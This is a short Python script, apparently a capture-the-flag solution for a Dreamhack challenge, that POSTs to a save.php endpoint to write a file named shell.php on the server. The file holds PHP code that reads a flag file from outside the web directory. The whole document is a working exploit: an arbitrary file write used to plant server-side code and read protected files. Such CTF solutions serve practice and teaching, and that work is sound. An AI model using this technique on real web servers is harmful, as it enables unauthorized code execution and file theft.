import requests

url = "http://host3.dreamhack.games:17227/save.php"
data = {
  'file': 'shell.php',
  'content': "<?php echo file_get_contents(__DIR__ . '/../flag'); ?>"
}
resp = requests.post(url, data=data)
print(resp.status_code)  # 200 OK 예상